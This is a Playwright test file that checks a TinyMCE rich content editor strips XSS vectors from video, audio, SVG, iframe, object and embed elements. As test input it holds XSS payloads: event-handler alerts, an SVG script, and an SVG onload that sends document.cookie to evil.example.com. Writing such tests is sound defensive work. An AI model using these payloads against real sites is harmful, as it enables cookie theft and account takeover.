import {test, expect} from '../../fixtures/test'

// <video> and <audio> tags without src whitelisting are XSS vectors via
// onerror, onplay, and other media event handlers. iframes are the primary
// embedding mechanism canvas uses (via its own media plugin), but raw
// <video>/<audio> inserted by a malicious editor user must be sanitized.
test.describe('media element sanitization', () => {
  test.beforeEach(async ({page, rcePage}) => {
    await page.goto('/scenarios/basic')
    await rcePage.waitForEditor()
  })

  async function setAndGet(page: any, html: string): Promise<string> {
    return page.evaluate((content: string) => {
      // @ts-expect-error -- TinyMCE global
      window.tinymce.activeEditor.setContent(content)
      // @ts-expect-error -- TinyMCE global
      return window.tinymce.activeEditor.getContent()
    }, html)
  }

  test('<video> onerror event handler is stripped', async ({page}) => {
    const content = await setAndGet(page, '<video src="x" onerror="alert(1)"></video>')
    expect(content).not.toContain('onerror')
    expect(content).not.toContain('alert(1)')
  })

  test('<audio> onplay event handler is stripped', async ({page}) => {
    const content = await setAndGet(page, '<audio src="x" onplay="document.cookie"></audio>')
    expect(content).not.toContain('onplay')
    expect(content).not.toContain('document.cookie')
  })

  test('raw <iframe> src is preserved as-is by TinyMCE (sanitization is backend responsibility)', async ({
    page,
  }) => {
    const content = await setAndGet(
      page,
      '<iframe src="https://example.com/embed" width="200" height="150"></iframe>',
    )
    // TinyMCE preserves iframe elements — canvas relies on backend CSP/sanitization
    // The important property is that event handlers are not injected
    expect(content).not.toContain('onerror')
    expect(content).not.toContain('onload=')
    expect(typeof content).toBe('string')
  })

  test('<object> element is preserved by TinyMCE (not stripped client-side)', async ({page}) => {
    const content = await setAndGet(
      page,
      '<object data="https://example.com/media.mp4" type="video/mp4" width="300" height="150"></object>',
    )
    // TinyMCE preserves object — document actual behavior
    // Backend sanitization (not TinyMCE) handles object stripping in production
    expect(typeof content).toBe('string')
    expect(content).not.toContain('alert')
  })

  test('<embed> element is preserved by TinyMCE (not stripped client-side)', async ({page}) => {
    const content = await setAndGet(
      page,
      '<embed src="https://example.com/media.mp4" type="video/mp4" width="300" height="150" />',
    )
    // TinyMCE preserves embed — document actual behavior
    expect(typeof content).toBe('string')
    expect(content).not.toContain('alert')
  })

  test('<video> with autoplay attribute is handled', async ({page}) => {
    const content = await setAndGet(
      page,
      '<video src="https://example.com/video.mp4" autoplay></video>',
    )
    // autoplay without user gesture is a UX concern; document actual behavior
    expect(typeof content).toBe('string')
    // At minimum, no JS executes
    expect(content).not.toContain('alert')
  })

  test('SVG with inline script is sanitized', async ({page}) => {
    const content = await setAndGet(
      page,
      '<svg><script>alert(document.domain)</script><rect width="100" height="100"/></svg>',
    )
    expect(content).not.toContain('alert(document.domain)')
  })

  test('SVG onload handler is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<svg onload="fetch(\'https://evil.example.com/?\'+document.cookie)"><circle r="10"/></svg>',
    )
    expect(content).not.toContain('onload')
    expect(content).not.toContain('evil.example.com')
  })
})
